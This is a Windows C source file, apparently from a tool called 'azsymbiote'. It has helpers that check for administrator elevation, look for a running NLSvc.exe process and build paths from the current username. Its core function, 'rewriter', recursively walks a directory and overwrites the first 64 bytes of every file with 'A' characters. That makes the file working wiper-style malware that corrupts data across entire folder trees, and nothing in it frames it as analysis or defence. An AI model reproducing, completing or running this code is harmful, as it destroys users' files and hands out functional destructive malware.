#include "azsymbiote.h"

// Exits the program with error code -1
void exit_system(void) {
    exit(-1);
}

// Checks if the current process has administrative privileges
BOOL check_elevation(void) {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    
    // Try to open the process token
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        // Get the elevation token information
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken)
        CloseHandle(hToken);
    return fRet;
}

// Checks if NLSvc.exe is running in the system
BOOL check_nlsvc(void) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    // Create snapshot of current processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL found = FALSE;

    // Iterate through all processes
    if (Process32First(snapshot, &entry)) {
        do {
            if (stricmp(entry.szExeFile, NLSVC) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}

// Gets the current username
char* get_username(void) {
    static char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserNameA(username, &username_len);
    return username;
}

// Builds a complete path by combining components
char* build_path(const char* base_path, const char* username, const char* suffix) {
    char* result = (char*)malloc(strlen(base_path) + strlen(username) + strlen(suffix) + 1);
    sprintf(result, "%s%s%s", base_path, username, suffix);
    return result;
}

// Recursively processes files in directory and its subdirectories
void rewriter(const char *dir) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    char path[MAX_PATH];
    char buffer[64];
    
    // Initialize buffer with 'A' characters
    memset(buffer, 'A', sizeof(buffer));
    sprintf(path, "%s\\*", dir);
    
    // Start file enumeration
    hFind = FindFirstFile(path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Skip special directories
        if (findFileData.cFileName[0] == '.') continue;
        
        // Build full path
        sprintf(path, "%s\\%s", dir, findFileData.cFileName);
        
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursively process subdirectories
            rewriter(path);
        } else {
            // Process regular files
            FILE *file = fopen(path, "r+b");
            if (file) {
                fwrite(buffer, 1, sizeof(buffer), file);
                fclose(file);
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
} 